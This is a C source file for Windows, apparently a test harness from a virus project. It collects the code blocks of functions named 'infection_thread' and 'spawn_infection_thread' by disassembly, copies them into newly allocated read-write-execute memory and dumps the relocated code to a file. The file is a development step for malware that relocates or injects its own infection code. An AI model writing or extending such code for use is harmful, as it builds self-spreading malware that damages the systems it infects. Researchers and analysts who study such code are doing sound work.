#undef NDEBUG
#include <assert.h>
#include <stdio.h>
#include <windows.h>

#include "code_begin.h"
#include "code_end.h"
#include "disasm/analysis/block.h"
#include "infection_thread.h"
#include "utility.h"

void *alloc_executable(size_t size) {
    return VirtualAlloc(NULL, (SIZE_T)size, MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE);
}

void free_mem(void *mem) {
    if (mem != NULL) {
        VirtualFree(mem, 0, MEM_RELEASE);
    }
}

void memdump(void * addr, size_t size, const char * filename) {
	FILE * f = fopen(filename, "w");
	if (f != NULL) {
		fwrite(addr, 1, size, f);
		fclose(f);
	}
}

int main(int argc, char **argv) {
    void *entrypoints[] = {(void *)spawn_infection_thread,
                           (void *)infection_thread, NULL};

	PRINT_DEBUG("Collecting blocks");
    BlockList *blocks =
        collect_blocks(entrypoints, (void *)code_begin, (void *)code_end);
    assert(blocks != NULL);
    size_t code_size = get_code_size(blocks);
    assert(code_size > 0);
    size_t target_max_size = get_target_code_size_max(blocks);
    assert(target_max_size > 0);

	PRINT_DEBUG("Code size = %.1fkB", (float)code_size / 1024.);

	PRINT_DEBUG("Allocating target memory");
    void *target_mem = alloc_executable(target_max_size);
    assert(target_mem != NULL);

	PRINT_DEBUG("Copying blocks");
	bool copy_success = copy_blocks(blocks, target_mem, target_max_size);
	assert(copy_success);

	memdump(target_mem, target_max_size, "copied_code.bin");

    free_mem(target_mem);

	PRINT_DEBUG("Finished");
	fgetc(stdin);

    return 0;
}
